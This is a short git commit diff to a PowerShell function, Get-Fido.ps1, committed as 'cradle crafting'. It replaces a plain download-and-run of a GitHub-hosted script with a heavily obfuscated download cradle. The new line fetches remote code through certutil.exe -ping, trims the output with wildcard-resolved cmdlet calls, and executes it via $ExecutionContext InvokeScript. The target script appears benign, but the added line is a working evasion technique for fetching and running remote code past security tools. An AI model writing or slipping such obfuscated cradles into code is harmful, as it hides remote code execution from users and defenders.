cbc9751bf93ee4a9e167d7d49e234b1a47cc778e
Your Name <you@example.com>
2023-08-10 13:16:23 +1000

    cradle crafting

--- functions/Get-Fido.ps1
+++ functions/Get-Fido.ps1
@@ -4,8 +4,7 @@ function Get-Fido {
   param(
 
   )
-  $scriptFido = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pbatard/Fido/master/Fido.ps1' -UseBasicParsing -OutFile $ENV:TEMP\Fido.ps1
-  & $scriptFido
+  Set-Variable qy 'https://raw.githubusercontent.com/pbatard/Fido/master/Fido.ps1'; $ExecutionContext.(($ExecutionContext | Get-Member)[6].Name).InvokeScript(((certutil.exe -ping (Get-Variable qy -Value) | &$ExecutionContext.(($ExecutionContext | Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext | Get-Member)[6].Name).PsObject.Methods | Where-Object { (Get-ChildItem Variable:_).Value.Name -like '*dl*ts' }).Name).Invoke('Sel*O*')-Skip 2 | &$ExecutionContext.(($ExecutionContext | Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext | Get-Member)[6].Name).PsObject.Methods | Where-Object { (Get-ChildItem Variable:_).Value.Name -like '*dl*ts' }).Name).Invoke('Sel*O*')-SkipL 1) -Join "`r`n"))
 }
 
 
